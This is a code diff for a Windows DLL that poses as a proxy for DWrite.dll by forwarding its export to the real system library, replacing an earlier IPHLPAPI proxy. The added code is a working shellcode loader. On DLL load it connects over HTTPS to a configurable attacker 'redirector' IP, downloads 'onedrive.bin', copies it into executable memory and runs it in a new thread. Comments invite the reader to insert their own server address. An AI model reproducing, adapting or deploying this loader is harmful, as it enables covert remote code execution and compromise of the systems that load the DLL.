-#pragma comment(linker,"/export:InternalGetUnicastIpAddressTable=C:\\Windows\\System32\\IPHLPAPI.InternalGetUnicastIpAddressTable,@214")
-#pragma comment(linker,"/export:InternalIcmpCreateFileEx=C:\\Windows\\System32\\IPHLPAPI.InternalIcmpCreateFileEx,@215")
-#pragma comment(linker,"/export:InternalSetIfEntry=C:\\Windows\\System32\\IPHLPAPI.InternalSetIfEntry,@216")
-#pragma comment(linker,"/export:InternalSetIpForwardEntry=C:\\Windows\\System32\\IPHLPAPI.InternalSetIpForwardEntry,@217")
-#pragma comment(linker,"/export:InternalSetIpForwardEntry2=C:\\Windows\\System32\\IPHLPAPI.InternalSetIpForwardEntry2,@218")
-#pragma comment(linker,"/export:InternalSetIpInterfaceEntry=C:\\Windows\\System32\\IPHLPAPI.InternalSetIpInterfaceEntry,@219")
-#pragma comment(linker,"/export:InternalSetIpNetEntry=C:\\Windows\\System32\\IPHLPAPI.InternalSetIpNetEntry,@220")
-#pragma comment(linker,"/export:InternalSetIpNetEntry2=C:\\Windows\\System32\\IPHLPAPI.InternalSetIpNetEntry2,@221")
-#pragma comment(linker,"/export:InternalSetIpStats=C:\\Windows\\System32\\IPHLPAPI.InternalSetIpStats,@222")
-#pragma comment(linker,"/export:InternalSetTcpEntry=C:\\Windows\\System32\\IPHLPAPI.InternalSetTcpEntry,@223")
-#pragma comment(linker,"/export:InternalSetTeredoPort=C:\\Windows\\System32\\IPHLPAPI.InternalSetTeredoPort,@224")
-#pragma comment(linker,"/export:InternalSetUnicastIpAddressEntry=C:\\Windows\\System32\\IPHLPAPI.InternalSetUnicastIpAddressEntry,@225")
-#pragma comment(linker,"/export:IpReleaseAddress=C:\\Windows\\System32\\IPHLPAPI.IpReleaseAddress,@226")
-#pragma comment(linker,"/export:IpRenewAddress=C:\\Windows\\System32\\IPHLPAPI.IpRenewAddress,@227")
-#pragma comment(linker,"/export:LookupPersistentTcpPortReservation=C:\\Windows\\System32\\IPHLPAPI.LookupPersistentTcpPortReservation,@228")
-#pragma comment(linker,"/export:LookupPersistentUdpPortReservation=C:\\Windows\\System32\\IPHLPAPI.LookupPersistentUdpPortReservation,@229")
-#pragma comment(linker,"/export:NTPTimeToNTFileTime=C:\\Windows\\System32\\IPHLPAPI.NTPTimeToNTFileTime,@230")
-#pragma comment(linker,"/export:NTTimeToNTPTime=C:\\Windows\\System32\\IPHLPAPI.NTTimeToNTPTime,@231")
-#pragma comment(linker,"/export:NhGetGuidFromInterfaceName=C:\\Windows\\System32\\IPHLPAPI.NhGetGuidFromInterfaceName,@232")
-#pragma comment(linker,"/export:NhGetInterfaceDescriptionFromGuid=C:\\Windows\\System32\\IPHLPAPI.NhGetInterfaceDescriptionFromGuid,@233")
-#pragma comment(linker,"/export:NhGetInterfaceNameFromDeviceGuid=C:\\Windows\\System32\\IPHLPAPI.NhGetInterfaceNameFromDeviceGuid,@234")
-#pragma comment(linker,"/export:NhGetInterfaceNameFromGuid=C:\\Windows\\System32\\IPHLPAPI.NhGetInterfaceNameFromGuid,@235")
-#pragma comment(linker,"/export:NhpAllocateAndGetInterfaceInfoFromStack=C:\\Windows\\System32\\IPHLPAPI.NhpAllocateAndGetInterfaceInfoFromStack,@236")
-#pragma comment(linker,"/export:NotifyAddrChange=C:\\Windows\\System32\\IPHLPAPI.NotifyAddrChange,@237")
-#pragma comment(linker,"/export:NotifyCompartmentChange=C:\\Windows\\System32\\IPHLPAPI.NotifyCompartmentChange,@238")
-#pragma comment(linker,"/export:NotifyIfTimestampConfigChange=C:\\Windows\\System32\\IPHLPAPI.NotifyIfTimestampConfigChange,@239")
-#pragma comment(linker,"/export:NotifyIpInterfaceChange=C:\\Windows\\System32\\IPHLPAPI.NotifyIpInterfaceChange,@240")
-#pragma comment(linker,"/export:NotifyNetworkConnectivityHintChange=C:\\Windows\\System32\\IPHLPAPI.NotifyNetworkConnectivityHintChange,@241")
-#pragma comment(linker,"/export:NotifyRouteChange=C:\\Windows\\System32\\IPHLPAPI.NotifyRouteChange,@242")
-#pragma comment(linker,"/export:NotifyRouteChange2=C:\\Windows\\System32\\IPHLPAPI.NotifyRouteChange2,@243")
-#pragma comment(linker,"/export:NotifyStableUnicastIpAddressTable=C:\\Windows\\System32\\IPHLPAPI.NotifyStableUnicastIpAddressTable,@244")
-#pragma comment(linker,"/export:NotifyTeredoPortChange=C:\\Windows\\System32\\IPHLPAPI.NotifyTeredoPortChange,@245")
-#pragma comment(linker,"/export:NotifyUnicastIpAddressChange=C:\\Windows\\System32\\IPHLPAPI.NotifyUnicastIpAddressChange,@246")
-#pragma comment(linker,"/export:OpenCompartment=C:\\Windows\\System32\\IPHLPAPI.OpenCompartment,@247")
-#pragma comment(linker,"/export:ParseNetworkString=C:\\Windows\\System32\\IPHLPAPI.ParseNetworkString,@248")
-#pragma comment(linker,"/export:PfAddFiltersToInterface=C:\\Windows\\System32\\IPHLPAPI.PfAddFiltersToInterface,@249")
-#pragma comment(linker,"/export:PfAddGlobalFilterToInterface=C:\\Windows\\System32\\IPHLPAPI.PfAddGlobalFilterToInterface,@250")
-#pragma comment(linker,"/export:PfBindInterfaceToIPAddress=C:\\Windows\\System32\\IPHLPAPI.PfBindInterfaceToIPAddress,@251")
-#pragma comment(linker,"/export:PfBindInterfaceToIndex=C:\\Windows\\System32\\IPHLPAPI.PfBindInterfaceToIndex,@252")
-#pragma comment(linker,"/export:PfCreateInterface=C:\\Windows\\System32\\IPHLPAPI.PfCreateInterface,@253")
-#pragma comment(linker,"/export:PfDeleteInterface=C:\\Windows\\System32\\IPHLPAPI.PfDeleteInterface,@254")
-#pragma comment(linker,"/export:PfDeleteLog=C:\\Windows\\System32\\IPHLPAPI.PfDeleteLog,@255")
-#pragma comment(linker,"/export:PfGetInterfaceStatistics=C:\\Windows\\System32\\IPHLPAPI.PfGetInterfaceStatistics,@256")
-#pragma comment(linker,"/export:PfMakeLog=C:\\Windows\\System32\\IPHLPAPI.PfMakeLog,@257")
-#pragma comment(linker,"/export:PfRebindFilters=C:\\Windows\\System32\\IPHLPAPI.PfRebindFilters,@258")
-#pragma comment(linker,"/export:PfRemoveFilterHandles=C:\\Windows\\System32\\IPHLPAPI.PfRemoveFilterHandles,@259")
-#pragma comment(linker,"/export:PfRemoveFiltersFromInterface=C:\\Windows\\System32\\IPHLPAPI.PfRemoveFiltersFromInterface,@260")
-#pragma comment(linker,"/export:PfRemoveGlobalFilterFromInterface=C:\\Windows\\System32\\IPHLPAPI.PfRemoveGlobalFilterFromInterface,@261")
-#pragma comment(linker,"/export:PfSetLogBuffer=C:\\Windows\\System32\\IPHLPAPI.PfSetLogBuffer,@262")
-#pragma comment(linker,"/export:PfTestPacket=C:\\Windows\\System32\\IPHLPAPI.PfTestPacket,@263")
-#pragma comment(linker,"/export:PfUnBindInterface=C:\\Windows\\System32\\IPHLPAPI.PfUnBindInterface,@264")
-#pragma comment(linker,"/export:ResolveIpNetEntry2=C:\\Windows\\System32\\IPHLPAPI.ResolveIpNetEntry2,@265")
-#pragma comment(linker,"/export:ResolveNeighbor=C:\\Windows\\System32\\IPHLPAPI.ResolveNeighbor,@266")
-#pragma comment(linker,"/export:RestoreMediaSense=C:\\Windows\\System32\\IPHLPAPI.RestoreMediaSense,@267")
-#pragma comment(linker,"/export:SendARP=C:\\Windows\\System32\\IPHLPAPI.SendARP,@268")
-#pragma comment(linker,"/export:SetAdapterIpAddress=C:\\Windows\\System32\\IPHLPAPI.SetAdapterIpAddress,@269")
-#pragma comment(linker,"/export:SetCurrentThreadCompartmentId=C:\\Windows\\System32\\IPHLPAPI.SetCurrentThreadCompartmentId,@270")
-#pragma comment(linker,"/export:SetCurrentThreadCompartmentScope=C:\\Windows\\System32\\IPHLPAPI.SetCurrentThreadCompartmentScope,@271")
-#pragma comment(linker,"/export:SetDnsSettings=C:\\Windows\\System32\\IPHLPAPI.SetDnsSettings,@272")
-#pragma comment(linker,"/export:SetIfEntry=C:\\Windows\\System32\\IPHLPAPI.SetIfEntry,@273")
-#pragma comment(linker,"/export:SetInterfaceDnsSettings=C:\\Windows\\System32\\IPHLPAPI.SetInterfaceDnsSettings,@274")
-#pragma comment(linker,"/export:SetIpForwardEntry=C:\\Windows\\System32\\IPHLPAPI.SetIpForwardEntry,@275")
-#pragma comment(linker,"/export:SetIpForwardEntry2=C:\\Windows\\System32\\IPHLPAPI.SetIpForwardEntry2,@276")
-#pragma comment(linker,"/export:SetIpInterfaceEntry=C:\\Windows\\System32\\IPHLPAPI.SetIpInterfaceEntry,@277")
-#pragma comment(linker,"/export:SetIpNetEntry=C:\\Windows\\System32\\IPHLPAPI.SetIpNetEntry,@278")
-#pragma comment(linker,"/export:SetIpNetEntry2=C:\\Windows\\System32\\IPHLPAPI.SetIpNetEntry2,@279")
-#pragma comment(linker,"/export:SetIpStatistics=C:\\Windows\\System32\\IPHLPAPI.SetIpStatistics,@280")
-#pragma comment(linker,"/export:SetIpStatisticsEx=C:\\Windows\\System32\\IPHLPAPI.SetIpStatisticsEx,@281")
-#pragma comment(linker,"/export:SetIpTTL=C:\\Windows\\System32\\IPHLPAPI.SetIpTTL,@282")
-#pragma comment(linker,"/export:SetJobCompartmentId=C:\\Windows\\System32\\IPHLPAPI.SetJobCompartmentId,@283")
-#pragma comment(linker,"/export:SetNetworkInformation=C:\\Windows\\System32\\IPHLPAPI.SetNetworkInformation,@284")
-#pragma comment(linker,"/export:SetPerTcp6ConnectionEStats=C:\\Windows\\System32\\IPHLPAPI.SetPerTcp6ConnectionEStats,@285")
-#pragma comment(linker,"/export:SetPerTcp6ConnectionStats=C:\\Windows\\System32\\IPHLPAPI.SetPerTcp6ConnectionStats,@286")
-#pragma comment(linker,"/export:SetPerTcpConnectionEStats=C:\\Windows\\System32\\IPHLPAPI.SetPerTcpConnectionEStats,@287")
-#pragma comment(linker,"/export:SetPerTcpConnectionStats=C:\\Windows\\System32\\IPHLPAPI.SetPerTcpConnectionStats,@288")
-#pragma comment(linker,"/export:SetSessionCompartmentId=C:\\Windows\\System32\\IPHLPAPI.SetSessionCompartmentId,@289")
-#pragma comment(linker,"/export:SetTcpEntry=C:\\Windows\\System32\\IPHLPAPI.SetTcpEntry,@290")
-#pragma comment(linker,"/export:SetUnicastIpAddressEntry=C:\\Windows\\System32\\IPHLPAPI.SetUnicastIpAddressEntry,@291")
-#pragma comment(linker,"/export:UnenableRouter=C:\\Windows\\System32\\IPHLPAPI.UnenableRouter,@292")
-#pragma comment(linker,"/export:do_echo_rep=C:\\Windows\\System32\\IPHLPAPI.do_echo_rep,@293")
-#pragma comment(linker,"/export:do_echo_req=C:\\Windows\\System32\\IPHLPAPI.do_echo_req,@294")
-#pragma comment(linker,"/export:if_indextoname=C:\\Windows\\System32\\IPHLPAPI.if_indextoname,@295")
-#pragma comment(linker,"/export:if_nametoindex=C:\\Windows\\System32\\IPHLPAPI.if_nametoindex,@296")
-#pragma comment(linker,"/export:register_icmp=C:\\Windows\\System32\\IPHLPAPI.register_icmp,@297")
-#pragma comment(lib, "Ws2_32.lib")
-#pragma comment(lib, "Mswsock.lib")
-#pragma comment(lib, "AdvApi32.lib")
+#pragma comment(lib, "winhttp.lib")
+#pragma comment(linker, "/export:DWriteCreateFactory=C:\\Windows\\System32\\DWrite.DWriteCreateFactory,@1")
+
+// Configuration - Replace with your redirector’s public IP
+char ip[] = "3.3.3.3";          // Your AWS redirector public IP
+char port[] = "443";            // HTTPS port
+char resource[] = "onedrive.bin"; // Shellcode file
 
 #define NtCurrentProcess() ((HANDLE)-1)
 #define DEFAULT_BUFLEN 4096
@@ -318,7 +18,7 @@ char resource[] = "iloveblogs.bin";
 #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
 #endif
 
-// NTAPI function declarations remain unchanged
+// NTAPI function declarations for shellcode execution
 EXTERN_C NTSTATUS NtAllocateVirtualMemory(
     HANDLE ProcessHandle,
     PVOID* BaseAddress,
@@ -327,6 +27,7 @@ EXTERN_C NTSTATUS NtAllocateVirtualMemory(
     ULONG AllocationType,
     ULONG Protect
 );
+
 EXTERN_C NTSTATUS NtProtectVirtualMemory(
     IN HANDLE ProcessHandle,
     IN OUT PVOID* BaseAddress,
@@ -334,6 +35,7 @@ EXTERN_C NTSTATUS NtProtectVirtualMemory(
     IN ULONG NewProtect,
     OUT PULONG OldProtect
 );
+
 EXTERN_C NTSTATUS NtCreateThreadEx(
     OUT PHANDLE hThread,
     IN ACCESS_MASK DesiredAccess,
@@ -347,127 +49,146 @@ EXTERN_C NTSTATUS NtCreateThreadEx(
     IN SIZE_T SizeOfStackReserve,
     OUT PVOID lpBytesBuffer
 );
+
 EXTERN_C NTSTATUS NtWaitForSingleObject(
     IN HANDLE Handle,
     IN BOOLEAN Alertable,
     IN PLARGE_INTEGER Timeout
 );
 
+// Function to fetch and execute shellcode over HTTPS
 void getShellcode_Run(char* host, char* port, char* resource) {
-    DWORD oldp = 0;
-    BOOL returnValue;
-    size_t origsize = strlen(host) + 1;
-    const size_t newsize = 100;
-    size_t convertedChars = 0;
-    wchar_t Whost[newsize];
-    mbstowcs_s(&convertedChars, Whost, origsize, host, _TRUNCATE);
+    DWORD dwSize = 0;
+    DWORD dwDownloaded = 0;
+    LPSTR pszOutBuffer = NULL;
+    BOOL bResults = FALSE;
+    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
 
-    WSADATA wsaData;
-    SOCKET ConnectSocket = INVALID_SOCKET;
-    struct addrinfo *result = NULL, *ptr = NULL, hints;
-    char sendbuf[MAX_PATH] = "";
-    lstrcatA(sendbuf, "GET /");
-    lstrcatA(sendbuf, resource);
-    char recvbuf[DEFAULT_BUFLEN];
-    memset(recvbuf, 0, DEFAULT_BUFLEN);
-    int iResult;
-    int recvbuflen = DEFAULT_BUFLEN;
+    // Convert host and resource to wide strings for WinHTTP
+    wchar_t wHost[100];
+    MultiByteToWideChar(CP_ACP, 0, host, -1, wHost, 100);
+    wchar_t wResource[100];
+    MultiByteToWideChar(CP_ACP, 0, resource, -1, wResource, 100);
 
-    // Initialize Winsock
-    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
-    if (iResult != 0) {
-        printf("WSAStartup failed with error: %d\n", iResult);
+    // Initialize WinHTTP session
+    hSession = WinHttpOpen(L"Shellcode Loader", 
+                           WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
+                           WINHTTP_NO_PROXY_NAME, 
+                           WINHTTP_NO_PROXY_BYPASS, 
+                           0);
+    if (!hSession) {
+        printf("WinHttpOpen failed with error: %ld\n", GetLastError());
         return;
     }
 
-    ZeroMemory(&hints, sizeof(hints));
-    hints.ai_family = PF_INET;
-    hints.ai_socktype = SOCK_STREAM;
-    hints.ai_protocol = IPPROTO_TCP;
-
-    // Resolve the server address and port
-    iResult = getaddrinfo(host, port, &hints, &result);
-    if (iResult != 0) {
-        printf("getaddrinfo failed with error: %d\n", iResult);
-        WSACleanup();
+    // Connect to the redirector
+    hConnect = WinHttpConnect(hSession, wHost, atoi(port), 0);
+    if (!hConnect) {
+        printf("WinHttpConnect failed with error: %ld\n", GetLastError());
+        WinHttpCloseHandle(hSession);
         return;
     }
 
-    // Attempt to connect to an address
-    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
-        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
-        if (ConnectSocket == INVALID_SOCKET) {
-            printf("socket failed with error: %ld\n", WSAGetLastError());
-            WSACleanup();
-            return;
+    // Create an HTTPS GET request
+    hRequest = WinHttpOpenRequest(hConnect, 
+                                  L"GET", 
+                                  wResource, 
+                                  NULL, 
+                                  WINHTTP_NO_REFERER, 
+                                  WINHTTP_DEFAULT_ACCEPT_TYPES, 
+                                  WINHTTP_FLAG_SECURE); // Enable SSL
+    if (!hRequest) {
+        printf("WinHttpOpenRequest failed with error: %ld\n", GetLastError());
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return;
+    }
+
+    // Send the request
+    bResults = WinHttpSendRequest(hRequest, 
+                                  WINHTTP_NO_ADDITIONAL_HEADERS, 
+                                  0, 
+                                  WINHTTP_NO_REQUEST_DATA, 
+                                  0, 
+                                  0, 
+                                  0);
+    if (!bResults) {
+        printf("WinHttpSendRequest failed with error: %ld\n", GetLastError());
+    } else {
+        bResults = WinHttpReceiveResponse(hRequest, NULL);
+        if (!bResults) {
+            printf("WinHttpReceiveResponse failed with error: %ld\n", GetLastError());
         }
-        printf("[+] Connecting to %s:%s\n", host, port);
-        iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
-        if (iResult == SOCKET_ERROR) {
-            closesocket(ConnectSocket);
-            ConnectSocket = INVALID_SOCKET;
-            continue;
-        }
-        break;
-    }
-    freeaddrinfo(result);
-
-    if (ConnectSocket == INVALID_SOCKET) {
-        printf("Unable to connect to server!\n");
-        WSACleanup();
-        return;
     }
 
-    // Send HTTP GET request
-    iResult = send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
-    if (iResult == SOCKET_ERROR) {
-        printf("send failed with error: %d\n", WSAGetLastError());
-        closesocket(ConnectSocket);
-        WSACleanup();
-        return;
-    }
-    printf("[+] Sent %ld Bytes\n", iResult);
-
-    // Shutdown sending
-    iResult = shutdown(ConnectSocket, SD_SEND);
-    if (iResult == SOCKET_ERROR) {
-        printf("shutdown failed with error: %d\n", WSAGetLastError());
-        closesocket(ConnectSocket);
-        WSACleanup();
-        return;
-    }
-
-    // Receive shellcode
-    do {
-        iResult = recv(ConnectSocket, (char*)recvbuf, recvbuflen, 0);
-        if (iResult > 0) {
-            printf("[+] Received %d Bytes\n", iResult);
-
-            // Allocate and execute shellcode
-            PVOID shellcodeAddr = NULL;
-            SIZE_T shellcodeSize = iResult;
-            NTSTATUS status = NtAllocateVirtualMemory(NtCurrentProcess(), &shellcodeAddr, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-            if (NT_SUCCESS(status)) {
-                memcpy(shellcodeAddr, recvbuf, iResult);
-                HANDLE hThread;
-                status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), (LPTHREAD_START_ROUTINE)shellcodeAddr, NULL, 0, 0, 0, 0, NULL);
-                if (NT_SUCCESS(status)) {
-                    NtWaitForSingleObject(hThread, FALSE, NULL);
-                    CloseHandle(hThread);
-                }
+    // Receive the shellcode
+    if (bResults) {
+        do {
+            dwSize = 0;
+            if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
+                printf("WinHttpQueryDataAvailable failed with error: %ld\n", GetLastError());
+                break;
             }
-        }
-        else if (iResult == 0)
-            printf("[+] Connection closed\n");
-        else
-            printf("recv failed with error: %d\n", WSAGetLastError());
-    } while (iResult > 0);
+            if (dwSize == 0) break;
+
+            pszOutBuffer = (LPSTR)malloc(dwSize + 1);
+            if (!pszOutBuffer) {
+                printf("Memory allocation failed\n");
+                break;
+            }
+            ZeroMemory(pszOutBuffer, dwSize + 1);
+
+            if (WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded)) {
+                printf("[+] Received %ld Bytes\n", dwDownloaded);
+
+                // Allocate memory and execute shellcode
+                PVOID shellcodeAddr = NULL;
+                SIZE_T shellcodeSize = dwDownloaded;
+                NTSTATUS status = NtAllocateVirtualMemory(NtCurrentProcess(), 
+                                                         &shellcodeAddr, 
+                                                         0, 
+                                                         &shellcodeSize, 
+                                                         MEM_COMMIT | MEM_RESERVE, 
+                                                         PAGE_EXECUTE_READWRITE);
+                if (NT_SUCCESS(status)) {
+                    memcpy(shellcodeAddr, pszOutBuffer, dwDownloaded);
+                    HANDLE hThread;
+                    status = NtCreateThreadEx(&hThread, 
+                                             THREAD_ALL_ACCESS, 
+                                             NULL, 
+                                             NtCurrentProcess(), 
+                                             (LPTHREAD_START_ROUTINE)shellcodeAddr, 
+                                             NULL, 
+                                             0, 
+                                             0, 
+                                             0, 
+                                             0, 
+                                             NULL);
+                    if (NT_SUCCESS(status)) {
+                        printf("[+] Shellcode executed\n");
+                        NtWaitForSingleObject(hThread, FALSE, NULL);
+                        CloseHandle(hThread);
+                    } else {
+                        printf("NtCreateThreadEx failed with status: 0x%08x\n", status);
+                    }
+                } else {
+                    printf("NtAllocateVirtualMemory failed with status: 0x%08x\n", status);
+                }
+            } else {
+                printf("WinHttpReadData failed with error: %ld\n", GetLastError());
+            }
+            free(pszOutBuffer);
+            pszOutBuffer = NULL;
+        } while (dwSize > 0);
+    }
 
     // Cleanup
-    closesocket(ConnectSocket);
-    WSACleanup();
+    if (hRequest) WinHttpCloseHandle(hRequest);
+    if (hConnect) WinHttpCloseHandle(hConnect);
+    if (hSession) WinHttpCloseHandle(hSession);
 }
 
+// DLL entry point
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
     switch (fdwReason) {
     case DLL_PROCESS_ATTACH:
